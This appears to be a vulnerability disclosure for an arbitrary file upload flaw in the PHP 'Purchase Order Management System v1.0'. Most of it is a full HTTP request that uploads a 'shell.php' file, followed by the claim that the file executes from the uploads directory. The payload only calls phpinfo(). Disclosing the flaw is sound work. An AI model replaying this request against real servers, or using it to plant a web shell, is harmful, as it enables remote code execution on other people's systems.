# Purchase Order Management System v1.0 by oretnom23 has Any file upload
vendors: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html

Vulnerability url: /purchase_order/admin/?page=system_info

Request package for file upload:

```
POST /purchase_order/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: localhost
Content-Length: 880
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4kTb0mE24bRNykxY
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/purchase_order/admin/?page=system_info
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=s87kdnnrqs6s4qkbpf0vps3gi4
Connection: close

------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="name"

s
------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="short_name"

b
------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="company_name"

v
------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="company_email"

d
------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="company_address"

e
------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundary4kTb0mE24bRNykxY
Content-Disposition: form-data; name="cover"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundary4kTb0mE24bRNykxY--
```

The file will be uploaded to the uploads directory

![image](https://github.com/lcg-22266/bug_pic/blob/main/upload.png)

We visit the url of the shell.php file and find that the code has been executed

Url: http://ip/purchase_order/uploads/1666942320_shell.php

![image](https://github.com/lcg-22266/bug_pic/blob/main/info.png)


